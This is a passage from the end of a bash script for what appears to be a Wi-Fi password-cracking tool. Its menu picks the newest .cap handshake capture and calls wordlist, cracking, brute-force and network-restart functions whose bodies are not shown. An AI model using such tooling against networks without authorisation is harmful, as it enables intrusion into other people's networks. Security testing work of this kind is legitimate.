                CAPTURE_FILE=$(ls -t "$CAP_FILE_PATH"/*.cap 2>/dev/null | head -1)
                if [[ -z "$CAPTURE_FILE" ]]; then
                    echo -e "${RED}[!] No .cap files found in output folder${NC}"
                    read -rp "Press Enter to continue..."
                    continue
                fi
                echo -e "${GREEN}[+] Using latest capture: ${WHITE}$(basename "$CAPTURE_FILE")${NC}"
                prepare_wordlist
                crack_password_terminal
                read -rp "Press Enter to continue..."
                ;;
            6)
                restart_network
                read -rp "Press Enter to continue..."
                ;;
            7)
                bruteforce_crack
                read -rp "Press Enter to continue..."
                ;;
            8)
                echo -e "${GREEN}[+] Exiting${NC}"
                exit 0
                ;;
            *)
                echo -e "${RED}[!] Invalid option${NC}"
                read -rp "Press Enter to continue..."
                ;;
        esac
    done
}

check_root
main_menu
